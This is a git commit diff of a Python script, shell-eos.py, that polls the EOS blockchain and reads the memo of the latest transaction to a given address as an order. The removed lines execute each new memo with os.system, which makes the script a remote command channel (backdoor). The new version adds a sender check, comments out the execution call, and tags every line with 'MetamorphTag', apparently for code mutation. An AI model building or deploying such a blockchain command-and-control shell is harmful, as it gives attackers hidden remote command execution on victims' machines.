db2ea323e7fe19355554a39af67864e38c20ed2c
Hecatomb <60758685+pedroelbanquero@users.noreply.github.com>
2021-09-12 08:22:20 -0500

    Update shell-eos.py

--- shell-eos.py
+++ shell-eos.py
@@ -1,40 +1,48 @@
-import sys
-import os
-import time
-import pytz
-import json
-from eospy.cleos import Cleos
-from prettytable import PrettyTable
-import random
+import sys ## MetamorphTag
+import os ## MetamorphTag
+import time ## MetamorphTag
+import pytz ## MetamorphTag
+import json ## MetamorphTag
+from eospy.cleos import Cleos ## MetamorphTag
+from prettytable import PrettyTable ## MetamorphTag
+import random ## MetamorphTag
 
 
+# Get availiable node to use as a data channel ## MetamorphTag
+def getworkingnode(): ## MetamorphTag
+    return "https://api.eosirio.io" ## MetamorphTag
 
-## download orders from the block
-def execfromeos(options):
-        try:
-            
-            last = open("last.dat","r").readlines()[0] 
-        except:
-            pass
+## download orders from the block ## MetamorphTag
+def execfromeos(options): ## MetamorphTag 
+        try: ## MetamorphTag
+            last = open("last.dat","r").readlines()[0]  ## MetamorphTag
+        except: ## MetamorphTag
+            pass ## MetamorphTag
             # start with improbable match
-            last="0912391827398172368712381726384563563687216837612458781"
-        addr = options[0]
-        # improve with a list
-        ## conect to eos availiable node
-        try:
-            ce = Cleos(url='https://api.eosrio.io')
+            last="0912391827398172368712381726384563563687216837612458781" ## MetamorphTag
+        addr = options[0] ## MetamorphTag
+       
+        # improve with a list ## MetamorphTag
+        ## conect to eos availiable node ## MetamorphTag
+        try: ## MetamorphTag
+            ce = Cleos(url='https://api.eosrio.io') ## MetamorphTag
 
-            get_actions = ce.get_actions(addr)
-            will = get_actions["actions"][-1]["action_trace"]["act"]["data"]["memo"]
+            get_actions = ce.get_actions(addr) ## MetamorphTag
+            will = get_actions["actions"][-1]["action_trace"]["act"]["data"]["memo"] ## MetamorphTag
+            print(get_actions["actions"][-1]["action_trace"]["act"]["data"])
+            
+            if get_actions["actions"][-1]["action_trace"]["act"]["from"]==sys.argv[2] and will !=(str(last)) and will != "": ## MetamorphTag
+                print(will) ## MetamorphTag
+                #os.system(will) ## MetamorphTag
+                open("last.dat","w").write(will) ## MetamorphTag
+        except: ## MetamorphTag
+            pass ## MetamorphTag
 
-            if will !=(str(last)) and will != "":
-                print(will)
-                os.system(will)
-                open("last.dat","w").write(will)
-        except:
-            pass
 
-while True:
-    execfromeos(sys.argv[1])
-    time.sleep(1)
+while True: ## MetamorphTag
+    
+    execfromeos(sys.argv[1]) ## MetamorphTag
+    time.sleep(1) ## MetamorphTag
+
+
 
